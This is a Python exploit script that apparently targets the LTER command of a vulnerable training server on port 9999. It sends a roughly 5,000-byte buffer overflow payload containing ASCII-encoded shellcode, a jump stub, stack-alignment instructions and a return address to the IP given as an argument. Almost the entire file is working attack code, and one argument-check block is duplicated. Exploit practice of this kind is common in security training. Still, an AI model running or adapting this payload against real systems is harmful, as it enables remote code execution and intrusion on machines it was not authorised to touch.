#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port
# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

# First stage of the Exploit.
FIRST_STAGE =  b'\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x50\x43\x6a\x29\x2d'                                       
FIRST_STAGE += b'\x78\x25\x7b\x22\x2d\x78\x21\x34\x23\x50\x25\x26\x2a\x4f\x3c\x25'                                       
FIRST_STAGE += b'\x41\x41\x30\x42\x2d\x2b\x60\x7f\x7f\x2d\x3d\x6f\x51\x7f\x2d\x21'                                       
FIRST_STAGE += b'\x31\x5e\x7b\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x68'                                       
FIRST_STAGE += b'\x7f\x3c\x3b\x2d\x75\x70\x6f\x38\x2d\x6b\x6f\x30\x22\x50\x25\x26'                                       
FIRST_STAGE += b'\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x2c\x3d\x3d\x46\x2d\x39\x38'                                       
FIRST_STAGE += b'\x22\x2a\x2d\x37\x37\x59\x38\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41'                                       
FIRST_STAGE += b'\x30\x42\x2d\x24\x5e\x7d\x7e\x2d\x2c\x6f\x7f\x5e\x2d\x27\x4f\x7f'                                       
FIRST_STAGE += b'\x5f\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x37\x59\x7f'                                       
FIRST_STAGE += b'\x3b\x2d\x26\x70\x3d\x34\x2d\x23\x6f\x3e\x3d\x50\x25\x26\x2a\x4f'                                       
FIRST_STAGE += b'\x3c\x25\x41\x41\x30\x42\x2d\x31\x41\x57\x24\x2d\x7a\x3e\x60\x66'                                       
FIRST_STAGE += b'\x2d\x56\x4e\x6d\x21\x50\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42'                                       
FIRST_STAGE += b'\x2d\x7f\x71\x68\x60\x2d\x7f\x65\x67\x21\x2d\x7f\x3c\x2d\x4d\x50'

# Long Jump Shell Code Generated with https://github.com/andresroldan/Automatic-ASCII-Shellcode-Subtraction-Encoder 
JUMP_ENCODE =  b'\x25\x26\x2a\x4f\x3c\x25\x41\x41\x30\x42\x2d\x69\x7c\x7f\x22\x2d'                                                                      
JUMP_ENCODE += b'\x41\x78\x77\x2b\x2d\x57\x7a\x78\x21\x50\x25\x26\x2a\x4f\x3c\x25'                                                                      
JUMP_ENCODE += b'\x41\x41\x30\x42\x2d\x70\x2c\x64\x6f\x2d\x7a\x3e\x38\x6f\x2d\x2d'                                                                      
JUMP_ENCODE += b'\x3e\x71\x21\x50'

# Generate a payload the server expects: Command followed by Data
PAYLOAD = (
    b'LTER .' +
    # Padding in the event we do not jump perfectly to the start of the array.
    # We use 'A' since the NOP command `0x90` is a bad character!
    b'A' * 16 + 
    b'\x54' +                   # PUSH ESP
    b'\x58' +                   # POP EAX
    b'\x66\x2d\x69\x02' +       # SUB AX,0x0269
    b'\x66\x2d\x69\x02' +       # SUB AX,0x0269
    b'\x66\x2d\x69\x02' +       # SUB AX,0x0269
    b'\x66\x2d\x69\x02' +       # SUB AX,0x0269
    b'\x50' +                   # PUSH EAX
    b'\x5c' +                   # POP ESP
    FIRST_STAGE +
    b'A' * (3574 - (16 + 20 + 79 + 4 + len(FIRST_STAGE))) +
    # Align stack for long jump
    b'\x54' +           # PUSH ESP
    b'\x58' +           # POP EAX
    b'\x2c\x30' +       # SUB AL,30
    b'\x50' +           # PUSH EAX
    b'\x5c' +           # POP ESP
    JUMP_ENCODE +
    b'A' * (79 - (6 + len(JUMP_ENCODE))) +   # Fill the rest of our buffer with A
    # JNZ SHORT +0x10: Will jump if ZF is 0
    b'\x75\x08' +
    # JZ SHORT +0x8: This will only happen if the previous jump did not happen and ZF is 1
    b'\x74\x06' +
    # 6250172B    5F                          POP EDI
    # 6250172C    5D                          POP EBP
    # 6250172D    C3                          RETN
    struct.pack('<L', 0x6250103B) +
    b'C' * 2 +
    # Align stack pointer
    b'\x54' +                   # PUSH ESP
    b'\x58' +                   # POP EAX
    b'\x66\x05\x1f\x12' +       # ADD AX,0x097F
    b'\x50' +                   # PUSH EAX
    b'\x5c' +                   # POP ESP
    b'\x25\x4a\x4d\x4e\x55' +   # AND EAX,0x554E4D4A
    b'\x25\x35\x32\x31\x2a' +   # AND EAX,0x2A313235
    b'\x05\x75\x40\x48\x48' +   # ADD EAX,48484075 
    b'\x05\x76\x40\x48\x48' +   # ADD EAX,48484076
    b'\x50' +                   # PUSH EAX
    b'C' * (5000 - (3574 + 4 + 2 + 8))
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)